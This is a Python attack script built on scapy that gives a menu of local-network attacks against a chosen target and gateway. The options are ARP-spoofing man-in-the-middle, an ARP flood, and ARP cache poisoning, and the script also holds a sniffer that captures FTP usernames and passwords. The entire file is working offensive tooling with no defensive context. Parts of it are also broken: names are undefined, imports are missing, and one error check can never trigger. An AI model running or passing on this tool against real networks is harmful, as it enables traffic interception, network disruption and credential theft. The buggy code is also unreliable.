#!/usr/bin/env python
import time
import sys
import os
import scapy.all as scapy
from scapy.layers.http import HTTPRequest

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answ[0][1].hwsrc

def enable_ip_forwarding():
    print ("\n[*] Enabling IP Forwarding...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print ("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def arp_spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    print ("\n[*] Restoring Targets...")

    send(ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 7)
    send(ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7)
    disable_ip_forwarding()
    print ("[*] Shutting Down...")
    sys.exit(1)

def arp_flood(target_ip, target_mac, gateway_ip, gateway_mac):
    sent_packets_count = 0
    try:
        while True:
            for _ in range(100):
                sent_packets_count += 1
                print("[+] Packets sent: " + str(sent_packets_count), end="\r")
                sys.stdout.flush()
                scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=scapy.RandIP()), verbose=False)
            print("[+] Flooding ARP requests...")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nStopping ARP flood attack and restoring network...")
        sys.exit(0)

def session_hijacking(interface):
    print("[*] Starting session hijacking...")

    def process_packet(packet):
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = packet[Raw].load.decode(errors='ignore')
                if 'USER' in payload or 'PASS' in payload:
                    print(f"[+] FTP Credentials: {payload.strip()}")

    print("[*] Sniffing on interface:", interface)
    scapy.sniff(iface=interface, store=False, prn=process_packet)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <gateway_ip>")
        sys.exit(1)

    enable_ip_forwarding()
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("[!] Unable to get gateway MAC address. Exiting..")
        sys.exit(0)
    else:
        print(f"[*] Gateway MAC address: {gateway_mac}")

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("[!] Unable to get target MAC address. Exiting..")
        sys.exit(0)
    else:
        print(f"[*] Target MAC address: {target_mac}")

    print("1. MITM\n2. ARP Flooding\n3. Session Hijacking")
    attack = input("Pick an attack: ")
    if attack == '1':
        target_2 = input("Enter another victim IP:")
        scapy.arp_mitm(target_ip, target_2)
    elif attack == '2':
        arp_flood(target_ip, target_mac, gateway_ip, gateway_mac)
    elif attack == '3':
        scapy.arpcachepoison(gateway_ip, target_ip, interval=2)
        # interface = input("Enter the network interface to sniff on: ")
        # session_hijacking(interface)
    else:
        print("Invalid choice. Exiting...")
        sys.exit(1)
